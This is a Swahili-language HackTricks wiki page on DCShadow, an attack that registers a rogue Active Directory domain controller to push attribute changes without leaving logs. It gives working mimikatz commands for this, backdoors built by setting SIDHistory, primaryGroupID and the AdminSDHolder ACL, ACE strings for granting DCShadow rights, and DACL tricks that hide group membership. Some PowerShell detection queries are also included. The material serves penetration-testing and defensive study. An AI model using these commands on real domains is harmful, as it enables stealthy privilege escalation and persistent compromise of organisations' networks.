# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

Husajili **Domain Controller** mpya katika AD na kuitumia **kusukuma attributes** (SIDHistory, SPNs...) kwenye objects zilizobainishwa **bila kuacha logs** zozote kuhusu **modifications**. **Unahitaji** privileges za **DA** na lazima uwe ndani ya **root domain**.\
Kumbuka kwamba ukitumia data isiyo sahihi, logs mbaya sana zitaonekana.<sup>[[2]](#references)</sup>

Ili kutekeleza attack hii unahitaji instances 2 za mimikatz. Moja kati yake itaanzisha RPC servers ikiwa na privileges za SYSTEM (lazima uonyeshe hapa mabadiliko unayotaka kufanya), na instance nyingine itatumika kusukuma values:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Kumbuka kwamba **`elevate::token`** haitafanya kazi katika session ya `mimikatz1`, kwa kuwa hiyo iliinua privileges za thread, lakini tunahitaji kuinua **privilege ya process**.\
Pia unaweza kuchagua LDAP object: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Unaweza kusukuma mabadiliko kutoka kwa DA au kutoka kwa user mwenye permissions hizi chache:

- Katika **domain object**:
- _DS-Install-Replica_ (Kuongeza/Kuondoa Replica katika Domain)
- _DS-Replication-Manage-Topology_ (Kusimamia Replication Topology)
- _DS-Replication-Synchronize_ (Replication Synchornization)
- **Sites object** (na children zake) katika **Configuration container**:
- _CreateChild and DeleteChild_
- **object ya computer iliyosajiliwa kama DC**:
- _WriteProperty_ (Sio Write)
- **target object**:
- _WriteProperty_ (Sio Write)

Unaweza kutumia [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) kumpa user asiye na privileges hizi privileges hizo (kumbuka kwamba hii itaacha baadhi ya logs). Hii ina restrictions nyingi zaidi kuliko kuwa na DA privileges.\
Kwa mfano: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Hii inamaanisha kwamba username _**student1**_ anapo-login kwenye machine _**mcorp-student1**_ ana DCShadow permissions juu ya object _**root1user**_.

## Kutumia DCShadow kuunda backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Change PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Matumizi mabaya ya primary group, mapengo ya enumeration, na detection

- `primaryGroupID` ni attribute tofauti na orodha ya group `member`. DCShadow/DSInternals inaweza kuiandika moja kwa moja (kwa mfano, kuweka `primaryGroupID=512` kwa **Domain Admins**) bila enforcement ya LSASS iliyo kwenye mfumo, lakini AD bado **humhamisha** mtumiaji: kubadilisha PGID kila mara huondoa membership kutoka kwenye primary group ya awali (tabia hiyo hiyo hutokea kwa group lengwa lolote), kwa hivyo huwezi kuhifadhi membership ya primary group ya zamani.<sup>[[1]](#references)</sup>
- Zana chaguomsingi huzuia kumwondoa mtumiaji kwenye primary group yake ya sasa (`ADUC`, `Remove-ADGroupMember`), kwa hiyo kubadilisha PGID kwa kawaida huhitaji direct directory writes (DCShadow/`Set-ADDBPrimaryGroup`).
- Taarifa za membership hazifanani:
- **Inajumuisha** members wanaotokana na primary group: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Haijumuishi** members wanaotokana na primary group: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit inayokagua `member`, `Get-ADUser <user> -Properties memberOf`.
- Ukaguzi wa recursive unaweza kuwakosa members wa primary group ikiwa **primary group yenyewe imewekwa ndani ya group nyingine** (kwa mfano, PGID ya mtumiaji inaelekeza kwenye group lililomo ndani ya Domain Admins); `Get-ADGroupMember -Recursive` au LDAP recursive filters haitamrudisha mtumiaji huyo isipokuwa recursion itatue primary groups waziwazi.
- Mbinu za DACL: attackers wanaweza **kukataa ReadProperty** kwenye `primaryGroupID` ya mtumiaji (au kwenye attribute ya group `member` kwa groups ambazo hazijalindwa na AdminSDHolder), na hivyo kuficha membership halisi kutoka kwa PowerShell queries nyingi; `net group` bado itatatua membership hiyo. Groups zinazolindwa na AdminSDHolder zitaweka upya makatazo hayo.

Mifano ya detection/monitoring:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Thibitisha cross-check ya privileged groups kwa kulinganisha matokeo ya `Get-ADGroupMember` na `Get-ADGroup -Properties member` au ADSI Edit ili kugundua tofauti zilizoletwa na `primaryGroupID` au attributes zilizofichwa.<sup>[[1]](#references)</sup>

## Shadowception - Kutoa ruhusa za DCShadow kwa kutumia DCShadow (bila modified permissions logs)

Tunahitaji kuongeza ACE zifuatazo, zikiwa na SID ya mtumiaji wetu mwishoni:<sup>[[2]](#references)</sup>

- Kwenye domain object:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Kwenye attacker computer object: `(A;;WP;;;UserSID)`
- Kwenye target user object: `(A;;WP;;;UserSID)`
- Kwenye Sites object katika Configuration container: `(A;CI;CCDC;;;UserSID)`

Ili kupata ACE ya sasa ya object: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

Katika hali hii unahitaji kufanya **mabadiliko kadhaa**, si moja tu. Katika **mimikatz1 session** (RPC server), tumia parameter ya **`/stack` kwa kila mabadiliko**. Kisha unahitaji kutumia **`/push`** mara moja tu ili kutekeleza mabadiliko yote yaliyowekwa kwenye rogue server.

[**Maelezo zaidi kuhusu DCShadow katika ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## References

- [1] [TrustedSec - Uchunguzi kuhusu tabia, utoaji wa ripoti na exploitation ya Primary Group](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [Maelezo ya DCShadow katika ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
{{#include ../../banners/hacktricks-training.md}}
